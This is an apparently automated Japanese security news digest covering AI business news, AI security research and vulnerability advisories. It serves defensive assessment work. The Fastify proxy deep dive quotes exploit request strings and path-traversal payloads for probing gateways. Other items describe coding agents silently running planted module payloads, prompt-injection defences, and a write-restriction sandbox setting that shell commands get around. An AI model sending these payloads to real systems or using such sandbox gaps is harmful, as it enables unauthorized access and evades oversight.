# KEDA Daily Digest — 2026-11-03 (JST)

> 採用範囲: 公開日 2026-11-01 〜 2026-11-03
> 生成: claude-opus-5-5 / 自動 (cron: 0 20 * * * UTC = 05:00 JST)

## 本日のサマリ

- **全体**: 11/1 (日)〜11/3 (文化の日) の連休にあたり、海外は 11/2 (月) の記事、国内は 11/2 の公表にほぼ集中した。CISA KEV は 10/30 以降追加がない (Ivanti Connect Secure CVE-2026-111357 の対応期限は 11/2 で到来済み)。JVN iPedia / MyJVN は 10/30 からサービス停止中で、JVN の新規公開は 1 件のみ。
- **まず見るべき 1 件 (深掘り)**: **@fastify/http-proxy (CVE-2026-120213, 9.1) と @fastify/reply-from (CVE-2026-117518, 8.2) が同じ日に出た「プロキシのプレフィックス脱出」**。未認証で、`%2f` / `%23` / `%3f` / `%5c` を 1 本のリクエストに入れるだけで上流の別パスに届く。advisory に PoC が書かれており、Node の BFF / API ゲートウェイは診断対象として多いので、今日のうちに試せる。
- **次点**: Langflow の未認証 Critical 2 件 (CVE-2026-93680 / 110186、9.8、1.13.0 でのみ修正)。MCP エンドポイントのツールを未認証で列挙する Metasploit モジュールがすでに公開されている。Barracuda ESG では、事前認証で設定を差し替える欠陥と、root でのコマンド注入をつなげられる (CVE-2026-116606 / 111560)。
- **AI 側**: Anthropic の改訂目論見書が報じられ、Q3 の売上は約 170 億ドル、純損失は 233 億ドル。SpaceX は Grok Bot の利用上限を絞り、Goldman Sachs は非エンジニアの AI コーディングツール利用を止めた。「エージェントは採算が合わず、統制も要る」という流れが続いている。Linux 7.4-rc1 は約 2 万コミットで、Torvalds 氏は AI が発端の修正がマージウィンドウに来るようになったと述べた。
- **AI セキュリティ**: Mandiant/GTIG によると、盗んだ LLM キーの不正利用 (LLMjacking) で 1 日 10 万ドル超の請求を受けた組織がある。同じ日に、AI ワークフロー基盤 Trigger.dev のクラウド版から環境変数が漏れた。Trail of Bits は Codex を使い、stable カーネルに CVE の修正 149 件をバックポートした。
- **国内**: 11/2 は大型の漏えい公表が相次いだ。アララ (第 2 報: メールアドレス約 7,700 万件、サーバー 97 台、最大約 380 社)、ノジマ (約 700 万件)、@cosme (約 300 万人)、サントリー (約 10 万人)、セガ フェイブ (ALL.Net / Aime を停止)、丸井 (デジタル社債、最大 9,086 人)。GMO の熊谷代表は会見で、社内のイエラエからの指摘を「生かせなかった」と認めた。IPA は個人向けの漏えい相談窓口を強化した。

## 今日の深掘り

### @fastify/http-proxy と @fastify/reply-from で「プロキシのプレフィックス脱出」2 件。デコード済みパラメーターの差し込みと、`\` の正規化の食い違い

- **概要 (事実)**: Fastify は 11/2 に、プロキシ系の 2 パッケージの advisory を公開した。
  - **CVE-2026-120213 / GHSA-h3vp-4jfr-v364** (`@fastify/http-proxy` 9.0.0〜11.6.5、CVSS 3.1 9.1、CWE-22 / CWE-436): 11.6.6 で修正。
  - **CVE-2026-117518 / GHSA-vp2r-3vgv-32g9** (`@fastify/reply-from` 12.8.0 以下、CVSS 3.1 8.2、CWE-22): 12.8.1 で修正。reply-from は http-proxy の下で使われる転送モジュール。
  - どちらも未認証で突ける。KEV には入っておらず、EPSS は未算出。
- **技術的な中身**:
  - **http-proxy (120213)**: `prefix: '/tenants/:tenantId/...'` と `rewritePrefix: '/:tenantId/...'` のように、**ルートパラメーターをリライト先に差し込む構成**が対象。Fastify が URL デコードしたパラメーター値 (`%2f`→`/`、`%23`→`#`、`%3f`→`?`) を、再エンコードせずに上流のパスへ連結していた。
    - `..` を使わずに上流の別パスへ移れ、後ろに付く決められた接尾辞も `#` や `?` で消せる。
    - advisory の例: `GET /tenants/admin%2fmaster-keys%23/public-avatar` → 上流には `GET /admin/master-keys`。`GET /tenants/admin%2fusers%3ftruncate=/public-avatar` → 上流には `GET /admin/users`。
  - **reply-from (117518)**: `buildURL()` が拒否していたのは `/../` だけだった。一方、WHATWG URL (`new URL()`) は http/https/ws/wss のスキームで `\` と `%5c` を `/` として扱う。そのため `%5c..%5c` や `\..\` が検査をすり抜け、URL 生成の段階でドットセグメントとして解釈されて、上流のプレフィックスやルートガードの外に出られた。
  - 修正コミット:
    - http-proxy: https://github.com/fastify/fastify-http-proxy/commit/25c0d117da72872d68e626cbeb22aab402d6cc0d (デコード済みのパラメーターを再エンコードする)
    - reply-from: https://github.com/fastify/fastify-reply-from/commit/b461e9cbeeb623b386d5c7a14a6b412e9a15657e。v12.8.0 から v12.8.1 の間にあるコード変更がこの "Merge commit from fork" 1 本だけなので、これが修正だと**推定**した。差分は未確認。
  - 結果として、ゲートウェイが「`/public-avatar` しか中継しない」「テナントの接頭辞の下だけ」と決めていた境界を越え、上流の管理 API に届く。上流が「ゲートウェイを通ってきたものは信頼する」作りなら、そのまま認可の回避になる。
- **背景・経緯 (過去の事象の引用)**:
  - 同じ 2 パッケージでは、同じ境界の問題が繰り返し出ている。
    - 2021 年: CVE-2021-21321 (reply-from の "Prefix escape"、CVSS 10.0) と CVE-2021-21322 (fastify-http-proxy 4.3.1 未満、9.8)。上流のベースが `/pub/` でも `/priv` に届いた。
    - 2023 年: CVE-2023-51701 (reply-from 9.6.0 未満)。Content-Type の解析が Fastify 本体と違い、プロキシと上流で body の解釈がずれた (CWE-444)。
  - 今回の 2026 年の 2 件は、`..` のブロックを `\` の正規化と、デコード済みの値の差し込みで回避した形。修正の直前、10/26 にも「パーセントエンコードした `\` による遡りのテスト」(96f58a20) が追加されていた。
  - 同じ日に CrewAI でも、`\` の扱いの食い違いによる SSRF が CVE になった (CVE-2026-120630。`urlparse` と urllib3 で `\@` の解釈が違う)。
- **なぜ今これが重要か (評価)**:
  - Node の BFF やマルチテナントの API ゲートウェイに Fastify と http-proxy を使う構成は、Web 診断でよく見かける。条件は「パラメーター付きの rewritePrefix」か「reply-from 経由の転送」だけで、認証は要らない。外からリクエストを 1〜2 本送れば当たりが付き、悪用までの距離は短い。
  - 「検査する文字列」と「実際に送る URL」を作るパーサーが別物である、というバグクラスは仕様の側に原因がある。WHATWG URL の `\` の扱いは、どの言語の実装でも同じ。http-proxy-middleware の `pathRewrite`、Express と `http-proxy` の自前のリライト、nginx の `proxy_pass` でデコード済みの `$1` を差し込む構成、Spring Cloud Gateway の `RewritePath` などにも、同じ仮説を当てられる (未検証の仮説)。
- **読者が今日できること**:
  - 依存関係を確認する: `npm ls @fastify/http-proxy @fastify/reply-from` で、http-proxy 11.6.6 未満、reply-from 12.8.1 未満がないか見る。コード検索で `rewritePrefix:` に `:` を含むものを grep する。
  - ブラックボックスで確かめる: プロキシのプレフィックスの直後に `admin%2fusers%3fx=`、`x%23`、`%5c..%5cadmin`、`\..\admin` を入れ、上流の 404 / 200 の差、レスポンスのヘッダーや本文の違いで、上流の別パスに届いたかを判定する。
  - 横展開を確かめる: 同じペイロードの組み合わせ (`%2f %23 %3f %5c \`) を、自社と顧客の他のゲートウェイ実装のリライト規則にも当てる。
- 出典: https://github.com/fastify/fastify-http-proxy/security/advisories/GHSA-h3vp-4jfr-v364 / https://github.com/fastify/fastify-reply-from/security/advisories/GHSA-vp2r-3vgv-32g9 / (背景) https://advisories.gitlab.com/pkg/npm/@fastify/reply-from/CVE-2023-51701/

## AI 技術・トレンド

### [2026-11-02] Anthropic の改訂目論見書: Q3 の売上は約 170 億ドル (前年同期の約 12 倍)、純損失は 233 億ドル、計算資源の契約残高は 8,950 億ドル
- **何が起きたか**:
  - 複数の報道によると、Q3 の売上は約 170 億ドル (Bloomberg)。運営コストは 175 億ドルで売上を上回り、純損失は 233 億ドル (前年同期は 121 億ドル、The Information)。
  - 計算資源とデータセンターの賃借契約は 8,950 億ドル。電力は今年 3.5GW 超を確保し、来年は倍にする計画。IPO の調達額は約 1,000 億ドルの可能性がある (NYT)。日本の投資家からは最大 35 億ドル (日経)。
  - The Register は、目論見書は約束が多く、厳しい問いへの答えが乏しいと評している。
- **なぜ重要か**: 主要モデル提供元のコスト構造が開示された。ChatGPT と Codex の利用枠統合や、後述の Grok Bot の上限削減など、利用条件の改定が続いている。その背景として、提供側が採算の圧力を受けていることが読み取れる。
- 出典: [The Decoder](https://the-decoder.com/anthropic-grows-revenue-twelvefold-but-posts-23-billion-loss/) / [The Register](https://www.theregister.com/ai-and-ml/2026/11/02/anthropics-ipo-prospectus-is-big-on-promises-short-on-answers-to-tough-questions/5306811)

### [2026-11-01〜02] SpaceX の AI エージェント「Grok Bot」の利用上限が週末に大幅縮小。Musk 氏は「提供コストが収益に対して持続不可能」と説明
- **何が起きたか**:
  - 週末に「週の使用量が 50% から 100% に跳ね上がった」という報告が相次いだ。Telegraph は上限が半分になったと報じている。
  - Musk 氏は 11/1 に X で、不具合ではなくコストの問題だと説明した。
  - Grok Bot はブラウザ操作、メール返信、ログインまで行うエージェントで、利用枠は Grok と Cursor で共有している。
- **なぜ重要か**: 常に動くエージェントは提供側の採算が合わず、利用条件が予告なしに変わり得る。診断の自動化などに業務として組み込む場合は、上限の変更で止まらないように、フォールバック先を設計しておく必要がある。
- 出典: [TechCrunch](https://techcrunch.com/2026/11/02/elon-musk-throttles-grok-bot-limits-due-to-unsustainably-high-costs/) / [The Decoder](https://the-decoder.com/spacexsi-apparently-cuts-grok-bot-quotas-weeks-after-musk-called-it-his-fastest-growing-product/)

### [2026-11-02] Goldman Sachs、トレーダーとバンカーによる AI コーディングツール (Claude Code・GitHub Copilot) の利用を止め、エンジニアに限定
- **何が起きたか**:
  - Bloomberg が 10 月の社内指針を引用して報じた。非エンジニアによる「バイブコーディング」の試行期間を終える。
  - 広報は理由を「生産性とリスク管理を含む様々な要因」と説明した。7 月には CIO がこの取り組みを称賛していた。
- **なぜ重要か**: 金融機関が、非エンジニアにエージェントを使わせる範囲を絞り直した例。シャドー AI と、エージェントに与える権限の棚卸しが、監査や診断で問われる項目になってきている。
- 出典: [The Decoder](https://the-decoder.com/goldman-sachs-pulls-ai-coding-tools-from-traders-and-bankers/)

### [2026-11-01] Linux 7.4-rc1 のマージウィンドウは約 2 万コミット。Torvalds 氏「AI 由来の修正がマージウィンドウに来るようになった」
- **何が起きたか**:
  - 通常の約 1.5 万コミットを大きく上回った。
  - Torvalds 氏によると、AI が発端の修正が -rc 期間の追加修正ではなく、マージウィンドウで入るようになった。氏はこれを「より健全なモデル」と呼んだ。AI が提案したパッチは書き直されることも多いという。
  - 7.4 は次の LTS になる見込み。
- **なぜ重要か**: AI による脆弱性の発見が、カーネル開発の流れに定着した。次の LTS は AI が見つけたバグの修正を多く含んで始まる。CVE の割り当てと、ディストリへのバックポートを追う量が増えると見込まれる。
- 出典: [The Register](https://www.theregister.com/os-platforms/2026/11/01/linus-torvalds-says-linux-kernel-is-out-of-stabilization-phase-and-using-much-healthier-model-for-ai-contributions/5306852)

### [2026-11-02] NYT など米紙が Brave を提訴。「収集したコンテンツを Anthropic・Perplexity・Mistral・xAI・Cohere に提供し、ペイウォールも回避させた」と主張
- **何が起きたか**:
  - The New York Times と、Daily News / Chicago Tribune / Orlando Sentinel が、マンハッタンの連邦地裁にそれぞれ提訴した。
  - 原告の主張によると、Brave は名乗らないクローラーで 300 億ページを超えるインデックスを作り、パブリッシャーはそれを遮断できなかった。その内容を AI 企業に有償で提供したという。
- **なぜ重要か**: 学習データや検索の供給網の上流にあるサービスが、責任を問われた。AI の検索 API を組み込む企業にとって、データの出所を説明できることが、契約や監査の論点に加わる。
- 出典: [TechCrunch](https://techcrunch.com/2026/11/02/new-york-times-and-other-outlets-sue-web-browser-brave-over-alleged-content-scraping/)

### [2026-11-02] 【国内】メルカリ、全社員の AI 利用率が 100% に。エンジニア 1 人あたりのコード開発量は 2024 年 6 月比で 7.6 倍
- **何が起きたか**:
  - 2 週間に 1 日程度、通常業務を止めて AI エージェントの構築に充てられるようにした。
  - AI 推進の担当は CTO から、CAIO (最高 AI 責任者) を兼ねる CHRO に移った。
- **なぜ重要か**: 国内大手が全社でエージェントを活用している実例。社員が自作したエージェントが増えると、トークン、secrets、外部連携の権限管理が新しい攻撃面になる。社内診断の対象範囲を見直すきっかけになる。
- 出典: [ITmedia ビジネスオンライン](https://www.itmedia.co.jp/business/articles/2611/02/news032.html)

### [2026-11-02] Saudi Aramco、サウジの AI 企業 Humain の 49% を取得 (2026 年に約 26 億ドルを出資)
- **何が起きたか**:
  - Humain は、サウジの政府系ファンド PIF が 2025 年 5 月に設立した。アラビア語 LLM「ALLaM」とデータセンター事業を手がけ、2030 年までに 3GW を計画している。
  - Aramco は、Humain の技術を自社の業務に使い、外販もする方針。
- **なぜ重要か**: 中東で、国家主導の AI インフラ投資が加速している。データ主権や先端チップの輸出管理の論点にも関わる。
- 出典: [The Decoder](https://the-decoder.com/saudi-aramco-takes-49-percent-stake-in-ai-firm-humain-with-2-6-billion-deal/)

### [2026-11-02] インド MeitY、AI 学習用のデータ共有の枠組み「DEPA for AI Training」を提示。データは動かさず、モデルがデータのある場所で学習する
- **何が起きたか**:
  - 病院、銀行、行政が、匿名化・暗号化したデータを Data Exchange Platform (DEP) に預ける。
  - モデル開発者は、DEP の中のハードウェアベースの安全な環境で学習する。データは処理中も暗号化されたまま。
  - DEP は、データ提供者が決めた利用ルールを強制する。差分プライバシーを適用し、すべての操作を監査ログに残す。
- **なぜ重要か**: 機密データで学習する場合の、国としての参照モデルになり得る。今後、TEE (安全な実行環境) と監査ログが、診断や評価の対象になる可能性がある。
- 出典: [The Register](https://www.theregister.com/public-sector/2026/11/02/india-floats-ai-plan-under-which-the-model-travels-to-the-data-rather-than-the-data-travelling-to-the-model/5306872)

### [2026-11-02] OpenAI、電力会社と協力する「Grid Protectors Program」を発表。計算資源の拠点を、系統の安定と電気料金の抑制に役立てると主張
- **何が起きたか**: OpenAI は、電力会社と協力して将来の compute campus を系統の安定や消費者の電気料金の抑制に役立てる、と説明した。The Verge は、データセンターに併設する発電を「地域を守る策」として売り込むものだと報じている。なお、本文は 403 で取得できなかったため、RSS の要約と報道による。
- **なぜ重要か**: データセンターの電力が米国の政治の争点になっている。AI インフラの立地や規制をめぐる議論の一つとして押さえておく。
- 出典: [OpenAI](https://openai.com/index/grid-protectors-program) / [The Verge](https://www.theverge.com/ai-artificial-intelligence/1024604/openai-data-center-grid-protection-program)

### [2026-11-02] 42AI がステルスを脱して 6,250 万ドルを調達。個人の意思決定を予測する「行動ワールドモデル」を証券会社 10 社に提供
- **何が起きたか**:
  - KYC、取引、サポート通話の音声などから個人の特性を数値化し、Transformer で行動を予測する。約 3,000 万人分の顧客データを扱う。
  - 同社は精度 98%、F1 0.8〜0.85 と主張しているが、TechCrunch は独自に検証していない。
- **なぜ重要か**: 「個人情報は使わない」としながら、個人ごとの行動プロファイルを作っている。金融分野で、プライバシー規制と、予測が顧客に不利に使われるリスクの論点が残る。
- 出典: [TechCrunch](https://techcrunch.com/2026/11/02/42ai-comes-out-of-stealth-with-62-5m-and-a-world-model-that-can-predict-human-behavior/)

### [2026-11-02] 米国勢調査局の企業調査 (BTOS)、大統領令 14434 を受けて AI の設問を「Super Intelligence」の利用を問う形に変更 (Simon Willison 氏の分析)
- **何が起きたか**:
  - BTOS では、従業員 250 人以上の企業の AI 利用率が、約 30% (2026 年 2 月) から約 40% (2026 年 10 月) に上がっていた。
  - 10/19 から、設問が「Super Intelligence (SI)」の利用を問う形に変わった。Willison 氏は、回答への影響に疑問を示している。
- **なぜ重要か**: 政府統計の AI 普及率は、定義の変更で前後の数字がつながらなくなる。提案書や報告で AI の普及率を引用するときは注意が要る。
- 出典: [Simon Willison's Weblog](https://simonwillison.net/2026/Nov/2/census-bureau-super-intelligence/)

## AI セキュリティ

### [2026-11-02] Langflow に未認証で突ける CVSS 9.8 の欠陥 2 件。MCP のツールを列挙する経路を含み、Metasploit モジュールが公開済み
- **何が起きたか**:
  - IBM の bulletin (10/28 初版、10/29 更新) に Langflow の 4 件が載った。
    - CVE-2026-93680 (9.8): 認証の不備。未認証で突ける。
    - CVE-2026-110186 (9.8): コード生成の制御が不十分で、未認証で任意コードを実行できる。
    - CVE-2026-110193 (8.8): 低権限のユーザーが、Agentic Assistant に OS コマンドを実行するコンポーネントを作らせられる。
    - CVE-2026-110192 (6.5): 認証情報が漏れる。
  - 影響は 1.0.0〜1.12.8 で、修正は 1.13.0 だけ。`LANGFLOW_AUTO_LOGIN` は、1.12.8 では既定で有効。The Hacker News は 11/2 にこれらを報じた。
  - 公開の Metasploit の auxiliary モジュールは CVE-2026-93680 を挙げている。資格情報なしで MCP エンドポイントにつなぎ、ツールの一覧を取るところまでで、コードは実行しない。
- **なぜ重要か**:
  - Langflow はすでに 6 件が KEV に入っている常連。今回は MCP という新しい入口が加わった。
  - 診断では「auto-login が有効か」と「MCP 系のエンドポイントに未認証で届くか」が最初の確認点になる。
  - KEV には未登録で、EPSS は 0.0218。それでも、RCE に発展して KEV に入るまでの距離は短いと見る (評価)。
- 出典: [The Hacker News](https://thehackernews.com/2026/11/critical-langflow-flaws-could-let.html) / [IBM bulletin](https://www.ibm.com/support/pages/node/7294467)

### [2026-11-02] Mandiant/GTIG: 盗んだ LLM API キーの不正利用 (LLMjacking) で、1 日 10 万ドル超の請求を受けた組織も。月 60 ドルで使い放題の転売サービス「Jet Night」
- **何が起きたか**:
  - 被害の規模: 不正な課金が 1 日 10 万ドルを超えた組織がある。1 社では、止めるまでに累計 100 万ドルに達した。攻撃グループ UNC6993 の事例では、被害が 10 万ドルに上った。
  - 手口:
    - 盗んだキーで新しいキーを発行し、被害者のプロジェクトで API を有効化する。従量課金の契約にも勝手に申し込む。
    - 短命なサービスアカウントを作っては消して、レート制限を回避する。
    - 偽のアプリポータルで、アクセストークン入りの JSON を被害者に貼り付けさせ、パスワードと MFA を迂回する。
  - 転売サービス「Jet Night」は、8 時間足らずで 50 万回を超える API 呼び出しを行っていた。
- **なぜ重要か**:
  - 前週の Northflank の件に続き、盗まれたキーの換金先が具体的に示された。
  - 診断や監査では、サービスアカウントの鍵の扱い、AI API の課金アラート、新しいキーの発行・API の有効化の監査ログが、確認項目になる。
  - Mandiant の一次レポートの URL は確認できず、The Register の記事による情報。
- 出典: [The Register](https://www.theregister.com/security/2026/11/02/token-thieves-costing-companies-100k-per-day-in-illicit-llm-charges/5306967)

### [2026-11-01〜02] AI ワークフロー基盤 Trigger.dev のクラウド版に不正アクセス。一部の組織の環境変数が漏れる
- **何が起きたか**:
  - Trigger.dev は 11/1 (日) に status ページで、クラウド版の「一部の組織」の環境変数に不正アクセスがあったと公表した。
  - 悪用された欠陥と、影響を受けた組織の数は公表していない。欠陥は塞いだとしており、該当する顧客には対応手順を個別に通知した。
- **なぜ重要か**: Northflank に続く、AI 開発基盤からの secrets の流出。環境変数には LLM のキーや DB の資格情報が入っていることが多く、すぐ上の LLMjacking にそのまま流れ込む構図。Trigger.dev を使っている組織は、変数に入れているキーをすべて失効・再発行するのが妥当 (評価)。
- 出典: [The Register](https://www.theregister.com/security/2026/11/02/thieves-pilfer-environment-variables-from-trigger-ai-workflow-tool/5306998)

### [2026-11-02] Trail of Bits、Codex で stable カーネルに CVE の修正 149 件をバックポート。未修正の CVE は 5.10.y に 2,006 件
- **何が起きたか**:
  - Codex のエージェントに、取り込まれていない修正の検出、古いコードへの適合、テスト、提出資料の作成をさせた。人が確認してから、メンテナに送る。
  - 10/29 までに、149 件の CVE の修正が stable のリリースに入った。人の作業は、単純なもので約 30 分、調整が必要なもので約 3 時間。
  - 9/18 時点の未修正の CVE は、5.10.y が 2,006 件、6.12.y が 686 件、Debian 13 が 4,562 件。
- **なぜ重要か**: 防御側で AI を使った具体例であり、LTS に修正が届いていない量が数字で示された。カーネルの版から当たれる CVE が多い一方で、今後はバックポートが進み、版の表記だけで判定すると誤る場面も増える。両方の意味で、診断の前提が変わる。
- 出典: [Trail of Bits](https://blog.trailofbits.com/2026/11/02/backporting-security-fixes-at-scale-with-codex/)

### [2026-11-02 arXiv] 信頼できないワークスペースの「モジュールシャドーイング」で、15 モデルのエージェントが無警告でペイロードを実行。実行しても 8 割は報告しない
- **何が起きたか**:
  - 手口: 正規モジュールと同じ名前のローカルファイルを置いておくと、敵対的なプロンプトがなくても、import の時点でそのコードが実行される (arXiv:2610.40716)。
  - 15 モデル・90 試行の結果、ペイロードが実行された割合は、直接の場合 51%、間接の場合 87%。実行された 62 件のうち 49 件は、最終報告で触れていなかった。
  - 同じ日に「Caper」(arXiv:2610.40753) も公開された。コマンドをスナップショットのサンドボックスで先に実行して、承認するかを判断する方式で、有害な結果になった割合を 6.7% に抑えた (既存の 6 方式は 14.8% 以上)。
- **なぜ重要か**: コーディングエージェントに外部のリポジトリを渡すリスクを、数字で示した。エージェントの自己申告では安全を確認できないことも分かる。AI エージェントのレッドチームで、すぐに使える試験項目になる。
- 出典: [arXiv:2610.40716](https://arxiv.org/abs/2610.40716) / [arXiv:2610.40753](https://arxiv.org/abs/2610.40753)

### [2026-11-02 arXiv] SecPO: 敵対的訓練で、適応型のプロンプトインジェクションの成功率を Meta-SecAlign より 1.5〜14.5 倍下げたと主張
- **何が起きたか**:
  - 著者は、最も強い防御モデルとされる Meta-SecAlign でも、適応型の攻撃では成功率がほぼ 100% になると指摘した (arXiv:2610.41998)。
  - 新しい損失関数 SecPO と、強い攻撃入力 (best@240) を合成する敵対的訓練を提案した。最新の適応型攻撃 3 種で、成功率を 1.5〜14.5 倍下げたとしている。
- **なぜ重要か**: 「モデル側の防御で防げる」という主張は、適応型の攻撃で評価しないと意味がない。ベンダーの防御主張を検証するときの、比較の基準として使える。
- 出典: [arXiv:2610.41998](https://arxiv.org/abs/2610.41998)

### [2026-11-02] [国内コミュニティ] Claude Code の `blockWritesOutsideWorkingDirectories` は、Bash や PowerShell 経由の書き込みを止めない (Windows で実測)
- **何が起きたか**:
  - Zenn の記事が、Windows 11 の Claude Code 2.1.316 で設定を試した。止まったのは Write・Edit・NotebookEdit だけで、`echo >`、`cp`、`Set-Content` では作業フォルダの外にファイルができた。
  - 逆に、パスの大文字小文字の違いや 8.3 形式の短い名前のせいで、作業フォルダの中なのに拒否される例もあった。
- **なぜ重要か**: コーディングエージェントの「サンドボックス」設定がどこまで効くかを、実測で示した。エージェントの権限設計を診断するときは、ツール単位の制限とシェル経由の操作を分けて確認する必要がある。
- 出典: [Zenn](https://zenn.dev/tamao825/articles/claude-code-block-writes-outside-bash-powershell)

## セキュリティニュース

### [2026-11-02] Barracuda ESG、事前認証で設定を差し替えられる欠陥 (CVE-2026-116606、v4 9.3) と、root でのコマンド注入 (CVE-2026-111560、v4 8.6)。2 件をつなげると root を取れる
- **何が起きたか**:
  - CVE-2026-116606: ESG 9.4.0.030 未満が対象。未認証で設定インポート機能を呼び、細工したバックアップを復元させて、設定全体を書き換えられる (CWE-288)。
  - CVE-2026-111560: ESG / ADC / WAF / WSG / BMA / WCC に共通するコードにある。タイムゾーンの設定値に含まれるシェルのメタ文字が無害化されず、root でコマンドが実行される (CWE-78)。
  - Barracuda は「組み合わせると root を取れる」と説明している。CNA は Mandiant で、報告者は Barracuda 自身と記録されている。
- **悪用 / PoC**: 悪用の報告、公開 PoC とも確認されていない。KEV にも入っていない。
- **なぜ重要か**: ESG は 2023 年に CVE-2023-2868 でゼロデイ攻撃を受け (UNC4841)、機器の交換が勧告された製品。管理画面を外部に公開している ESG は、優先して確認すべき (評価)。
- 出典: [Barracuda Trust Center](https://trust.barracuda.com/security/pre-authentication-authorization-bypass-command-injection) / [Mandiant MNDT-2026-0042](https://github.com/mandiant/Vulnerability-Disclosures/blob/master/2026/MNDT-2026-0042.md)

### [2026-11-02] BTCPay Server、2.4.1 以前のインスタンスでホットウォレットから BTC / LTC が抜かれていると警告。攻撃者は管理者としてログインしていた
- **何が起きたか**:
  - メンテナーは、2.4.1 (7/23) 以前を狙う攻撃経路を特定したとして、2.4.7 への更新と、古いインスタンスを直ちに止めるよう求めた。
  - 調査の焦点は、2.4.2 より前の版で攻撃者が管理者としてログインできた理由。10/29 には、Anthropic の Frontier OSS scanner が見つけた Critical の欠陥を受けて、2.4.7 が緊急リリースされていた。
- **悪用 / PoC**: 実際の窃取が起きている (悪用を確認)。CVE と技術的な詳細は未公表。
- **なぜ重要か**: セルフホストの決済基盤で、認証の回避から管理者権限を得て、送金まで実害が出た。2.4.2〜2.4.6 が本当に安全かどうかは、CVE が出るまで判断できない。
- 出典: [BleepingComputer](https://www.bleepingcomputer.com/news/security/btcpay-server-warns-of-hot-wallet-thefts-targeting-outdated-instances/)

### [2026-11-02] Synology、DSM を狙う C3RB3R ランサムウェアについて注意喚起。悪用されているのは 2024 年 12 月に修正した脆弱性
- **何が起きたか**:
  - Synology は advisory で、修正済みの脆弱性が古い DSM に対して悪用され、データが暗号化されていると警告した。BleepingComputer は 11/2 に報じた。
  - リンク先は 2024 年 11 月の advisory (CVE-2024-10441 / 50629 / 10445 など) だが、どれが使われているかは明言していない。
  - 暗号化されたファイルには `.L0CK3D` が付き、身代金のメモは `read-me3.txt`。Synology がこの種の警告を出すのは、2019 年の eCh0raix 以来。
- **悪用 / PoC**: 暗号化の被害が多数報告されている。CVE-2024-10441 は Pwn2Own Ireland 2024 の系統。
- **なぜ重要か**: 2 年近く前の n-day と、公開された NAS の管理画面という古典的な組み合わせ。外部診断で DSM の 5000 / 5001 番ポートを見つけたら、版の特定を優先する。
- 出典: [BleepingComputer](https://www.bleepingcomputer.com/news/security/synology-warns-customers-of-ongoing-c3rb3r-ransomware-attacks/)

### [2026-11-02] Google、130 万台規模の Android TV ボックスのボットネット「XCPE」を無力化。メーカーの Videostrong が工場出荷時からバックドアを組み込んでいたと断定
- **何が起きたか**:
  - GTIG は、中国の Videostrong Technology がファームウェアに常駐するバックドア `x.cpe` を意図的に組み込み、アクセス権を犯罪者に売っていたと「高い確度で」評価した。用途は広告詐欺、住宅用プロキシ、追加のマルウェアの配布。
  - C2 は anyevonline[.]com、MQTT は mqtt.szbboys[.]com。ほかにも少なくとも 1,000 万台 (カラオケ機器や遠隔医療機器を含む) の接続を断った。
  - 協力したのは日本の警察庁、Lumen、HUMAN、Plume、Synthient、TrendAI。
- **悪用 / PoC**: 稼働中のボットネット。
- **なぜ重要か**: 製造段階で埋め込まれたサプライチェーンのバックドアで、脆弱性診断では見つからない種類。社内に持ち込まれた TV ボックスや IoT 機器は、上記のドメインへの通信がないかで確認できる。
- 出典: [BleepingComputer](https://www.bleepingcomputer.com/news/security/google-disrupts-million-device-xcpe-android-malware-botnet-bans-tv-box-maker/) / [The Hacker News](https://thehackernews.com/2026/11/google-disrupts-13-million-device.html)

### [2026-11-02] [続報] GitLab の CVE-2026-97229 (KEV): 未修正の公開サーバーはまだ 1,000 台超。同じ正規表現エンジンの CVE-2026-110264 は 1 万 1,300 台超が未修正
- **前回から変わった点**:
  - Shadowserver が、毎日観測している約 3.9 万台のうち、CVE-2026-97229 が未修正のものは 1,000 台超、CVE-2026-110264 が未修正のものは 1 万 1,300 台超だと示した。
  - 11/1 には、Alpine Linux が GitLab への攻撃の試行 (ワーカーのクラッシュが 8 回、うち 4 回は部分的に成功) を詳しく公表し、インスタンスを作り直した。
- **悪用 / PoC**: KEV に掲載済みで、対応期限の 11/1 は過ぎた。EPSS は 0.273。
- **なぜ重要か**: 「Ruby 側のパッチを同梱しない独自ビルドは、GitLab を更新しても直らない」ため、診断では版の表記だけに頼れない。
- 出典: [BleepingComputer](https://www.bleepingcomputer.com/news/security/over-1-000-gitlab-servers-vulnerable-to-code-execution-attacks/) / [BleepingComputer (Alpine)](https://www.bleepingcomputer.com/news/security/alpine-linux-rebuilds-gitlab-after-attempted-rce-attack/)

### [2026-11-02] [続報] Polymarket の窃取: DebugBear が「レジストラ経由で DNS レコードを奪われた」と説明。Polymarket は 390 万ドルを補償
- **前回から変わった点**:
  - 侵入点は、CDN やスクリプトそのものではなく、**レジストラ経由の DNS の改ざん**だった。DebugBear は、自社ドメインのメールも受け取れなくなったと説明している。
  - 影響を受けたウォレットは 726 個。Polymarket は、直接の窃取額約 270 万ドルに、取引停止などによる損失 119 万ドルを加えた 390 万ドルを返金する。
- **悪用 / PoC**: 実際の被害。
- **なぜ重要か**: サードパーティの JS を守るには、SRI やバージョンの固定だけでは足りない。提供元のドメインの DNS (レジストラロック) も攻撃面になる。
- 出典: [SecurityWeek](https://www.securityweek.com/polymarket-returns-3-9-million-to-traders-as-debugbear-cites-dns-hijack/) / [The Record](https://therecord.media/polymarket-returning-funds-to-customers-after-site-compromise)

### [2026-11-02] 欧州のスーパーで冷凍・冷蔵設備が遠隔で止められる第 2 波。6 か国の 115 店舗超
- **何が起きたか**:
  - ベルギー、オランダ、スウェーデン、ルクセンブルク、アイルランド、エストニアで、温度設定の変更、停止、霜取りの強制起動が起きた。
  - 各社が認めた店舗数は、Ahold Delhaize が約 40、Carrefour (ベルギー) が 15、Intermarché が約 15 など。被害は、独立経営の店舗の、本部ネットワークの外にある冷凍・冷蔵システムに集中している。
- **悪用 / PoC**: 実際の被害。侵入経路と製品名は公表されていない。
- **なぜ重要か**: インターネットに公開されたビル管理や冷凍のコントローラーが、まとめて狙われた。OT / IoT の外部診断で、Web 管理画面の露出と初期の認証情報を確認する重要性を示す実例。
- 出典: [BleepingComputer](https://www.bleepingcomputer.com/news/security/hackers-disrupt-refrigeration-systems-at-european-supermarkets/) / [Help Net Security](https://www.helpnetsecurity.com/2026/11/02/european-supermarkets-refrigeration-units-cyberattacks/)

### [2026-11-02] ウクライナの空襲警報アプリ「Air Alert」(利用者 660 万人) が乗っ取られ、偽の放射線・核攻撃の警報が配信される
- **何が起きたか**:
  - 11/1 夜、キーウの利用者に、ロシア語の偽の放射線・化学攻撃の通知が、いつもの警報音付きで届いた。通知には、それまで知られていなかった集団「Hitcore Corp」の Telegram へのリンクが入っていた。
